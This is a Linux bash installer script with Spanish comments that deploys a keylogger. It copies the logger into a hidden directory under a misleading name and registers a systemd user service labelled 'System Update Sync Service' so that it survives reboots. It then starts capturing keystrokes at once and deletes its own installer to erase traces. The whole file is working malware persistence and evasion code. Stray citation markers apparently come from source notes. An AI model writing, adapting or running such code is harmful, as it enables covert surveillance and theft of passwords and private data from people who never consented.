#!/bin/bash

# --- FASE DE MIMETIZACIÓN ---
# Creamos una ruta que parezca legítima del sistema para ocultar el keylogger [cite: 32, 40]
TARGET_DIR="$HOME/.local/share/system-service"
mkdir -p "$TARGET_DIR"

# Movemos el script del keylogger (que debe estar en la misma carpeta que este .sh)
# Lo renombramos a algo que no levante sospechas en el monitor de procesos [cite: 19]
cp sys_daemon.py "$TARGET_DIR/svc_update.py"

# --- FASE DE PERSISTENCIA (Systemd) ---
# Esta es la parte técnica que sobrevive a reinicios [cite: 32]
# Creamos un "User Service" que Linux ejecutará automáticamente al iniciar sesión
SERVICE_FILE="$HOME/.config/systemd/user/sys-update.service"
mkdir -p "$HOME/.config/systemd/user/"

cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Sync Service
After=network.target

[Service]
# Ejecuta el keylogger usando el intérprete de python3
ExecStart=/usr/bin/python3 $TARGET_DIR/svc_update.py
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
EOF

# --- FASE DE ACTIVACIÓN SILENCIOSA ---
# Recargamos el demonio de servicios para que reconozca el nuevo archivo
systemctl --user daemon-reload

# Habilitamos el servicio para que sea persistente [cite: 32]
systemctl --user enable sys-update.service

# Iniciamos el proceso de inmediato para empezar a capturar teclas
systemctl --user start sys-update.service

# --- LIMPIEZA DE HUELLAS (Antiforense) ---
# Borramos el instalador para que el usuario no vea el archivo descargado [cite: 42]
rm -- "$0"
